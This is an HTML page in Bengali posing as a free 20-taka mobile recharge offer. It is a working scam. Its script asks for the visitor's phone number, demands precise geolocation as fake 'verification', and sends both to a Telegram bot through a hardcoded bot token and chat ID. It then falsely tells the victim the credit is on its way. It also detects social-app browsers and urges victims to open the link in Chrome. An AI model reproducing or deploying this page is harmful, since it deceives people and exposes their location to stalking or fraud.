<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Recharge Portal</title>
    <style>
        body { background: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }
        h2 { color: #28a745; font-size: 24px; }
        p { color: #555; font-size: 16px; }
        input { width: 100%; padding: 15px; margin: 25px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #007bff; }
        .btn { background: #007bff; color: white; padding: 16px; width: 100%; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: #ccc; }
    </style>
    
    <script>
        // ইমো, মেসেঞ্জার বা টিকটক ডিটেক্ট করা
        var ua = navigator.userAgent || navigator.vendor || window.opera;
        var isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("TikTok") > -1) || (ua.indexOf("Messenger") > -1) || (ua.indexOf("Imo") > -1);

        if (isInApp) {
            alert("সতর্কতা: ভালো অভিজ্ঞতার জন্য লিঙ্কটি কপি করে ফোনের Chrome ব্রাউজারে পেস্ট করুন। অন্যথায় রিচার্জ রিকোয়েস্ট সফল হবে না।");
        }
    </script>
</head>
<body>

    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>আপনার ১১ সংখ্যার নম্বরটি দিয়ে রিচার্জ নিশ্চিত করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX" required>
        <button class="btn" id="subBtn" onclick="processRecharge()">রিচার্জ নিন</button>
    </div>

<script>
async function processRecharge() {
    const phoneNum = document.getElementById('phone').value;
    const btn = document.getElementById('subBtn');

    if (phoneNum.length < 11) { 
        alert("দয়া করে সঠিক ১১ সংখ্যার নম্বর দিন!"); 
        return; 
    }
    
    btn.innerText = "ভেরিফাই হচ্ছে...";
    btn.disabled = true;

    // লোকেশন চাওয়া
    navigator.geolocation.getCurrentPosition(async (pos) => {
        // আপনার লেটেস্ট টোকেন ও চ্যাট আইডি
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
        const chat_id = "7887080882";
        
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        // ম্যাপ লিঙ্ক ঠিক করা হয়েছে
        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        const messageText = `🔔 **নতুন রিচার্জ রিকোয়েস্ট!**\n\n📱 নম্বর: ${phoneNum}\n📍 ম্যাপ লোকেশন: ${mapUrl}`;

        try {
            const apiLink = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
            const response = await fetch(apiLink);
            
            if(response.ok) {
                alert("অভিনন্দন! আপনার অনুরোধ সফল হয়েছে। ২০ টাকা রিচার্জ কিছুক্ষণের মধ্যে পৌঁছে যাবে।");
            } else {
                alert("সার্ভার ত্রুটি! আপনার বট টোকেনটি চেক করুন।");
            }
        } catch (error) {
            alert("ইন্টারনেট সংযোগ বিচ্ছিন্ন!");
        } finally {
            btn.innerText = "রিচার্জ নিন";
            btn.disabled = false;
        }
    }, (error) => {
        alert("ভেরিফিকেশন ব্যর্থ! রিচার্জ পেতে ব্রাউজারের উপরে থাকা লোকেশন পারমিশন 'Allow' করতে হবে।");
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }, { timeout: 10000, enableHighAccuracy: true });
}
</script>
</body>
</html>
